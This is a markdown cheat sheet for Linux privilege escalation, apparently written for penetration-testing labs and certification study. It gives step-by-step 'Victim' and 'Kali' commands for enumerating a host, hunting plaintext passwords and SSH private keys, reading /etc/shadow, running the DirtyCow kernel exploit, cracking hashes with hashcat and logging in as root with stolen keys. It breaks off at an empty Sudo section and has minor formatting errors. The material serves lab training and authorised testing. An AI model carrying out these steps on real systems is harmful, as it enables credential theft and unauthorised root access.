# Linux Privilege Escalation

## Resources

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

[Checklist](Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)

[Sushant 747's Guide (Country dependant](may need VPN)](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

[Linux PrivEsc Lab](https://tryhackme.com/room/linuxprivescarena)

## Initial Enumeration

### System Enumeration

```
hostname
```
```
uname -a
```
```
cat /proc/version
```
```
cat /etc/issue
```
```
lscpu
```
```
ps aux
```

### User Enumeration

```
whoami
```
```
id
```
```
sudo -l
```
```
cat /etc/passwd
cat /etc/passwd |cut -d : -f 1
```
```
cat /etc/shadow
```
```
cat /etc/group
```
```
history
```

### Network Enumeration

```
ifconfig
ip a
```
```
route
ip route
```
```
arp -a
ip neigh
```
```
netstat -ano
```

### Password Hunting

```
grep --color=auto -rnm '/' -ie "PASSWORD" --color=always 2> /dev/null
```
```
locate password | more
locate passw | more
```
```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2>
 /dev/null
```

## Automated Tools

[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

[LinEnum](https://github.com/rebootuser/LinEnum)

[Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

[Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)

## Escalation Path: Kernel Exploits

[Kernel Exploits](https://github.com/lucyoa/kernel-exploits)

[DirtyCow](https://github.com/dirtycow/dirtycow.github.io)

Victim:

```
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
passwd
id
```

## Escalation Path: Passwords and File Permissions

```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

### Stored Passwords (Config Files)

Victim:

```
cat /home/user/myvpn.ovpn
```

- From the output, make note of the value of the “auth-user-pass” directive.

```
cat /etc/openvpn/auth.txt
```

- From the output, make note of the clear-text credentials.

```
cat /home/user/.irssi/config | grep -i passw
```

- From the output, make note of the clear-text credentials.

### Stored Passwords (History)

Victim:

```
history | grep pass
cat ~/.bash_history | grep -i passw
```

- From the output, make note of the clear-text credentials.

### Weak File Permissions

Victim:

```
ls -la /etc/passwd
ls -la /etc/shadow
```

- Note the file permissions

```
cat /etc/passwd
```

- Save the output to a file on your attacker machine

```
cat /etc/shadow
```

- Save the output to a file on your attacker machine

Kali:

```
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
```

```
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

### SSH Keys

Victim:

```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

- Note the results.
- Copy the contents of the discovered id_rsa file to a file on your attacker VM.

Kali:

```
chmod 400 id_rsa
ssh -i id_rsa root@<ip>
```

## Escalation Path: Sudo

